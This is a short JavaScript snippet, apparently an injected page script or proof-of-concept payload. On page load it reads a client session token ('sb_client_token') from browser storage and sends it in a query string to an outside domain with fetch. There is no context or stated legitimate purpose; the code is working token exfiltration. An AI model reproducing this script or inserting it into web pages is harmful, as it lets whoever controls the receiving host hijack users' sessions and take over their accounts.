document.addEventListener("DOMContentLoaded", () => {
    const sessionToken = sessionStorage.getItem("sb_client_token");
    const localToken = localStorage.getItem("sb_client_token");
    const token = sessionToken || localToken;

    if (token) {
        fetch(`https://spandanpokhrel.com.np/?token=${encodeURIComponent(token)}`)
        .then(response => response.text())
        .catch(error => console.error("Error sending token:", error));
    }
});
